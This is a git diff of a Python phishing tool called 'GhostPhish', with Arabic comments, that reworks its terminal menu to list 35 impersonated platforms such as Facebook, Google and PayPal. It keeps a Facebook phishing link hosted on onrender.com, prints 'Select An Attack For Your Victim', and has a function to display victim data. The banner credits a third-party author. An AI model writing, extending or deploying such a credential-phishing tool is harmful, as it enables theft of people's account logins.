@@ -9,34 +9,31 @@ import threading
 import time
 import sys
 
-# ========== الألوان حسب الصورة ==========
-ORANGE = "\033[38;5;208m"   # برتقالي للشعار فقط
-WHITE = "\033[97m"          # أبيض للنصوص الأساسية
-GREEN = "\033[92m"          # أخضر فاتح للأرقام والحالات الإيجابية
-DARK_GRAY = "\033[90m"      # رمادي للحالات السلبية (غير مفعل)
+# ========== ألوان الصورة ==========
+ORANGE = "\033[38;5;208m"   # برتقالي للشعار
+WHITE = "\033[97m"          # أبيض للنصوص
+GREEN = "\033[92m"          # أخضر للأرقام و (مفعل)
+DARK_GRAY = "\033[90m"      # رمادي لـ (غير مفعل)
 BOLD = '\033[1m'
 RESET = '\033[0m'
-# ==========================================
+# ===================================
 
 CONFIG_FILE = "ghostphish_config.json"
 
-# ─── توليد 55 منصة (20 أصلية + 35 جديدة) ───
-LINKS = {}
-PLATFORMS = {}
-
-original_names = {
-    1: "فيسبوك", 2: "انستغرام", 3: "تويتر", 4: "سناب شات", 5: "تيك توك",
-    6: "جيميل", 7: "ياهو", 8: "Outlook", 9: "بنك", 10: "منصة 10",
-    11: "منصة 11", 12: "منصة 12", 13: "منصة 13", 14: "منصة 14", 15: "منصة 15",
-    16: "منصة 16", 17: "منصة 17", 18: "منصة 18", 19: "منصة 19", 20: "منصة 20"
+# ─── المنصات الـ 35 كما في الصورة بالضبط ───
+PLATFORMS = {
+    1: "Facebook", 2: "Instagram", 3: "Google", 4: "Microsoft", 5: "Netflix",
+    6: "Paypal", 7: "Steam", 8: "Twitter", 9: "Playstation", 10: "Tiktok",
+    11: "Twitch", 12: "Pinterest", 13: "Snapchat", 14: "LinkedIn", 15: "Ebay",
+    16: "Quora", 17: "Protonmail", 18: "Spotify", 19: "Reddit", 20: "Adobe",
+    21: "DeviantArt", 22: "Badoo", 23: "Origin", 24: "DropBox", 25: "Yahoo",
+    26: "Wordpress", 27: "Yandex", 28: "StackoverFlow", 29: "Vk", 30: "XBOX",
+    31: "Mediafire", 32: "Gitlab", 33: "Github", 34: "Discord", 35: "Roblox"
 }
-new_names = [f"منصة {i}" for i in range(21, 56)]
-all_names = {**original_names, **{i+21: name for i, name in enumerate(new_names)}}
-PLATFORMS = all_names
 
-LINKS[1] = "https://facebook-vjj9.onrender.com"
-for i in range(2, 56):
-    LINKS[i] = ""
+# الروابط (فعلت فيسبوك فقط كمثال، الباقي فارغ)
+LINKS = {i: "" for i in range(1, 36)}
+LINKS[1] = "https://facebook-vjj9.onrender.com"   # رابط فيسبوك مفعل
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -60,32 +57,36 @@ def print_banner():
 \____/\___/\____/____/\__/_/   /_/ /_/_/____/_/ /_/
 {RESET}"""
     print(banner)
+    print(WHITE + "Version : 2.3.5" + RESET)
+    print(WHITE + "[–] Tool Created by htr-tech (tahmid.rayat)" + RESET)
+    print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)
 
 def print_menu():
-    total = 55
-    mid = (total + 1) // 2  # 28
-    print(WHITE + "═" * 60 + RESET)
-    print(WHITE + BOLD + f"           قائمة المنصات ({total})" + RESET)
+    # عمودين: الأيسر (1-18) والأيمن (19-35)
+    left_range = range(1, 19)   # 1 إلى 18
+    right_range = range(19, 36) # 19 إلى 35
+
     print(WHITE + "═" * 60 + RESET)
 
-    for i in range(1, mid + 1):
-        left_num = i
-        right_num = i + mid
+    for left_num in left_range:
+        right_num = left_num + 18  # لأن 1+18=19، 2+18=20 ... 18+18=36 (لكن 36 غير موجود، نتحقق)
         
-        left_status = f"{GREEN}(مفعل)" if LINKS.get(left_num) else f"{DARK_GRAY}(غير مفعل)"
-        left_line = f"{GREEN}{left_num}{RESET} - {WHITE}{PLATFORMS[left_num]} {left_status}"
+        left_name = PLATFORMS[left_num]
+        left_status = f"{GREEN}(مفعل)" if LINKS[left_num] else f"{DARK_GRAY}(غير مفعل)"
+        left_line = f"{GREEN}[{left_num:02d}]{RESET} {WHITE}{left_name}{RESET} {left_status}"
         
-        if right_num <= total:
-            right_status = f"{GREEN}(مفعل)" if LINKS.get(right_num) else f"{DARK_GRAY}(غير مفعل)"
-            right_line = f"{GREEN}{right_num}{RESET} - {WHITE}{PLATFORMS[right_num]} {right_status}"
-        else:
-            right_line = ""
+        right_line = ""
+        if right_num <= 35:
+            right_name = PLATFORMS[right_num]
+            right_status = f"{GREEN}(مفعل)" if LINKS[right_num] else f"{DARK_GRAY}(غير مفعل)"
+            right_line = f"{GREEN}[{right_num:02d}]{RESET} {WHITE}{right_name}{RESET} {right_status}"
         
-        # ضبط المسافات للعمودين
+        # ضبط المسافات بحيث يكون العمود الأيمن ثابتاً
         print(f"{left_line:<45}{right_line}")
 
     print(WHITE + "═" * 60 + RESET)
-    print(f"{GREEN}0{RESET} - {WHITE}خروج{RESET}")
+    print(f"{GREEN}[99]{RESET} {WHITE}About{RESET}    {GREEN}[00]{RESET} {WHITE}Exit{RESET}")
+    print(WHITE + "[–] Select an option : " + RESET, end="")
 
 def display_victim_data(message):
     print("\n" + WHITE + "═" * 40 + RESET)
@@ -130,15 +131,24 @@ def main():
 
     while True:
         print_menu()
-        choice = input(f"{GREEN}> {RESET}").strip()
+        choice = input().strip()
 
-        if choice == "0":
+        if choice == "00" or choice == "0":
             print(f"{WHITE}إيقاف الأداة...{RESET}")
             sys.exit(0)
 
+        if choice == "99":
+            clear_screen()
+            print_banner()
+            print(f"{WHITE}هذه أداة GhostPhish – إصدار 2.3.5{RESET}")
+            input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
+            clear_screen()
+            print_banner()
+            continue
+
         if choice.isdigit():
             num = int(choice)
-            if 1 <= num <= 55:
+            if 1 <= num <= 35:
                 if LINKS[num] == "":
                     clear_screen()
                     print_banner()
@@ -161,7 +171,7 @@ def main():
             else:
                 clear_screen()
                 print_banner()
-                print(f"{WHITE}رقم غير صحيح (1-55){RESET}")
+                print(f"{WHITE}رقم غير صحيح (استخدم 01-35 أو 99/00){RESET}")
                 input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                 clear_screen()
                 print_banner()
